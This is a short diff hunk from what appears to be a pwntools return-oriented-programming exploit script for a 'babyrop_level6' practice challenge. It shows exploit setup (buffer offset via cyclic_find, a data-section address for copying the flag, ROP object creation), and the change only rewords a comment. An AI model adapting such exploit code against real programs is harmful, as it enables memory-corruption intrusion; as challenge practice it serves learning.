@@ -19,7 +19,7 @@ else:
     p = s.process("./babyrop_level6_testing1")
 
 nop = cyclic_find("laaaaaaa", n=8)
-data_section = 0x404500 # known memory address in data section where flag's filename and flag content will get copied
+data_section = 0x404500 # known memory address in data section where flag's filename and later flag content will get copied
 
 rop = ROP(elf)
 
